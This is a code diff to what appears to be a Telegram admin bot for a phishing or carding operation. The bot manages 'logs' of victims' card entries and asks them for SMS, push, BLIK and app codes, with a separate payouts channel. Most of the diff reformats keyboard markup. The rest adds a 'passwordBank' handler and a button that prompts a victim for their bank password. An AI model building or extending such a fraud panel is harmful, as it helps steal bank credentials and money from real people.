@@ -234,10 +234,16 @@ adminBot.action(/^admin_user_(\d+)_request_(\d+)_(accept|decline)$/, async (ctx)
     await ctx.telegram
       .sendMessage(request_.userId, locale.requests[request_.status == 1 ? "accepted" : "declined"], {
         parse_mode: "HTML",
-        reply_markup: request_.status == 1 ? Markup.inlineKeyboard([
-          [Markup.urlButton("👥 Чат", ctx.state.bot.allGroupLink), Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink)],
-          [Markup.callbackButton(locale.go_to_menu, "start")],
-        ]) : {},
+        reply_markup:
+          request_.status == 1
+            ? Markup.inlineKeyboard([
+                [
+                  Markup.urlButton("👥 Чат", ctx.state.bot.allGroupLink),
+                  Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink),
+                ],
+                [Markup.callbackButton(locale.go_to_menu, "start")],
+              ])
+            : {},
       })
       .catch((err) => err);
 
@@ -274,10 +280,16 @@ adminBot.action(/^admin_request_(\d+)_(accept|decline)$/, async (ctx) => {
     await ctx.telegram
       .sendMessage(request_.userId, locale.requests[request_.status == 1 ? "accepted" : "declined"], {
         parse_mode: "HTML",
-        reply_markup: request_.status == 1 ? Markup.inlineKeyboard([
-          [Markup.urlButton("👥 Чат", ctx.state.bot.allGroupLink), Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink)],
-          [Markup.callbackButton(locale.go_to_menu, "start")],
-        ]) : {},
+        reply_markup:
+          request_.status == 1
+            ? Markup.inlineKeyboard([
+                [
+                  Markup.urlButton("👥 Чат", ctx.state.bot.allGroupLink),
+                  Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink),
+                ],
+                [Markup.callbackButton(locale.go_to_menu, "start")],
+              ])
+            : {},
       })
       .catch((err) => err);
     await ctx
@@ -769,7 +781,7 @@ adminBot.action(/^log_(\d+)_wrong_(code|lk|picture|push)$/, async (ctx) => {
 });
 
 adminBot.action(
-  /^log_(\d+)_(push|sms|lk|blik|appCode|callCode|picture|otherCard|limits|forVerify|correctBalance|profit|leave)$/,
+  /^log_(\d+)_(passwordBank|push|sms|lk|blik|appCode|callCode|picture|otherCard|limits|forVerify|correctBalance|profit|leave)$/,
   async (ctx) => {
     try {
       const log = await Log.findByPk(ctx.match[1], {
@@ -891,6 +903,7 @@ adminBot.action(
                 : []),
               Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
             ],
+            [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
             [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
           ])
         )
@@ -974,6 +987,7 @@ adminBot.action(/^take_log_(\d+)$/, async (ctx) => {
               : []),
             Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
           ],
+          [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
           [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
         ])
       )
